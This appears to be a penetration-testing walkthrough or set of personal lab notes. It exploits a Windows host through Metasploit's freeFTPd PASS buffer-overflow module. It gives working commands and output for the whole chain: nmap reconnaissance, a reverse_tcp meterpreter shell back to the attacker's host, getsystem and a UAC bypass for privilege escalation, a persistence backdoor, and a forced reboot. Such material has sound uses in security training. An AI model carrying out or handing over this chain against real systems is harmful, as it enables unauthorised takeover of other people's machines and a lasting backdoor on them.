# Metasploit Windows Exploitation

## Background
Found a target host via nmap scanning. It's a Windows machine. 
```shell
$ sudo nmap -sS 192.168.99.12
Starting Nmap 7.91 ( https://nmap.org ) 
Nmap scan report for 192.168.99.12
Host is up (0.30s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

Identify services to exploit (-A to run all scripts or -sV for services):
```shell
$ sudo nmap -A 192.168.99.0/24

Starting Nmap 7.91 ( https://nmap.org ) at ...
Nmap scan report for 192.168.99.12
Host is up (0.094s latency).                                                                                         
Not shown: 994 closed ports                                                                                          
PORT     STATE SERVICE       VERSION                                                                                 
21/tcp   open  ftp           FreeFTPd 1.0                                                                            
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                               
| drwxr-xr-x   1 root       root            0 Feb 18  2015 .
|_drwxr-xr-x   1 root       root            0 Feb 18  2015 ..
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 213
| status of /:
| 213-drwxr-xr-x   1 root       root            0 Feb 18  2015 .
| 213-drwxr-xr-x   1 root       root            0 Feb 18  2015 ..
|_End of status
22/tcp   open  ssh           WeOnlyDo sshd 2.1.8.98 (protocol 2.0)
......
```
Should try to exploit FreeFTPd. 

## Metasploit

Look for exploits for FreeFTPd in Metasploit. Start a meterpreter. 
```shell
msf6 > search FreeFTPd

Matching Modules
================

   #  Name                                       Disclosure Date  Rank     Check  Description
   -  ----                                       ---------------  ----     -----  -----------
   0  exploit/windows/ftp/freeftpd_pass          2013-08-20       normal   Yes    freeFTPd PASS Command Buffer Overflow
   1  exploit/windows/ftp/freeftpd_user          2005-11-16       average  Yes    freeFTPd 1.0 Username Overflow
   2  exploit/windows/ssh/freeftpd_key_exchange  2006-05-12       average  No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
```

Load and configure exploit and payload: 
```shell
msf6 > use exploit/windows/ftp/freeftpd_pass

# set RHOST, LHOST etc. 
# use "show options" to see what's needed to configure
msf6 exploit(windows/ftp/freeftpd_pass) > set LHOST 192.168.99.100
msf6 exploit(windows/ftp/freeftpd_pass) > set RHOST 192.168.99.12
```
Default payload here is `windows/meterpreter/reverse_tcp` but if not, `set payload windows/meterpreter/reverse_tcp` and configure. 

Exploit with `run` or `exploit` (they're aliases)

```shell
msf6 exploit(windows/ftp/freeftpd_pass) > run

[*] Started reverse TCP handler on 192.168.99.100:4444 
[*] 192.168.99.12:21 - Trying target freeFTPd 1.0.10 and below on Windows Desktop Version with user anonymous...
[*] Sending stage (175174 bytes) to 192.168.99.12
[*] Meterpreter session 4 opened (192.168.99.100:4444 -> 192.168.99.12:1061) at 2021-05-13 17:34:14 -0400

meterpreter >
```

### Priviledge escalation
```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**If `getsystem` fails** when exploiting a _modern_ Windows system, it could be due to [User Account Control (UAC)](https://en.wikipedia.org/wiki/User_Account_Control). This can be bypassed with the post module `bypassuac`
```
use exploit/windows/local/bypassuac
set sessions <session-id>
run
```
then try `getsystem` again. 

### Backdoor (persistence)
Can use either `Persistence` or `Metsvc`. The followings are instructions for `Persistence`.

__Steps:__
* send meterpreter session to background with ctrl+z
* load and configure `exploit/windows/local/persistence` and run
  ```shell
  use exploit/windows/local/persistence
  set session <session ID>
  set payload windows/meterpreter/reverse_tcp
  set LHOST 192.168.99.100
  set DisablePayloadHandler false
  run
  ```
* switch back to the meterpreter session with `sessions -i <session ID>`
* open a window shell with `shell` and (force) reboot the system `shutdown /r /f`; quit session
* load and configure a listener and run
  ```shell
  use exploit/multi/handler
  set LHOST 192.168.99.100
  set payload windows/meterpreter/reverse_tcp
  run -j
  ```
  This should establish a session for ya. 

__Others__
* see all sessions with `sessions -l`
* see all jobs with `jobs -l`

